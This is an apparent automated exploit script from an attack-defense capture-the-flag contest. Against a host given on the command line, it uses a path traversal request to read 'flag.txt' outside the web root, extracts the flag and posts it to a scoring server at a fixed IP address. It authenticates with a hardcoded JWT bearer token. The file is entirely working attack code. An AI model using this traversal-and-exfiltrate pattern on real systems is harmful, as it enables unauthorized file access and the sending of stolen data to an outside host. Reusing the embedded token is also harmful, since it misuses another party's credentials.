#!/usr/bin/env python3

import requests
import sys
import re

host = sys.argv[1]

SYSTEM_URL = 'http://13.212.152.221:5000/api/flag'
SYSTEM_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNDIwNjIyOSwianRpIjoiNzliNmQwYWMtMDZlNS00NTliLWE4ZjAtMGM5MjYxNjllM2Q4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ1c2VybmFtZSI6IkdpcmxzIEJhbmQgQ3J5In0sIm5iZiI6MTcyNDIwNjIyOSwiY3NyZiI6ImRjY2NhZjM3LTgyMDYtNDI1Ny04MThmLTBjZDg3MDgwYTU4NiIsImV4cCI6MTcyNDI5MjYyOX0.hPz00_Z06cWm0VtzpjZgvjdor4n78vzqmTT3ouMsIIM'
token = "Bearer " + SYSTEM_TOKEN


try:
    r = requests.get("http://" + host + ":10000?image=../../../../flag.txt",)
except:
    print("Error")
    exit(1)

try:
    flag = re.search(r'WreckIT50\{([^}]+)\}', r.text).group(1)

    r = requests.post(SYSTEM_URL,
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                            },
                        json={
                                'flag': flag
                        })
    print(flag, flush=True)
    print(r.json())

except:
    exit(1)